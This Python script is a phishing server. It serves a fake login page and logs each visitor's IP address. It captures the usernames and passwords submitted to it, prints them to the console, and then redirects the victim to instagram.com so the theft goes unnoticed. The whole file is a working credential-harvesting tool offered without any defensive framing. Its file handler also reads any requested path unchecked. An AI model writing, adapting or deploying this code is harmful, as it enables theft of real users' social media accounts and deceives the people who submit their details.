from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import socketserver

connected_ips = []

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        ip = self.client_address[0]
        if ip not in connected_ips:
            connected_ips.append(ip)
            print("[-] Got shehin from", ip)
            print()
        if self.path == "/":
            self.path = "/index.html"
        try:
            file_to_open = open(self.path[1:], "rb").read()
            self.send_response(200)
        except Exception as e:
            print(e)
            file_to_open = b"File Not Found"
            self.send_response(404)

        self.end_headers()
        self.wfile.write(file_to_open)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()

        self.send_response(301)
        self.send_header('Location','https://www.instagram.com')
        self.end_headers()
        self.wfile.write(bytes(post_data, "utf-8"))
        post_data = parse_qs(post_data)
        username = post_data["username"][0]
        password = post_data["password"][0]
        print(f"[+] Username: {username}")
        print(f"[+] Password: {password}")
        print("-"*10)

    def log_message(self, format, *args):
        return


PORT = 8000
with socketserver.TCPServer(("", PORT), Server) as httpd:
    print("[-] Serving at port:", PORT)
    httpd.serve_forever()
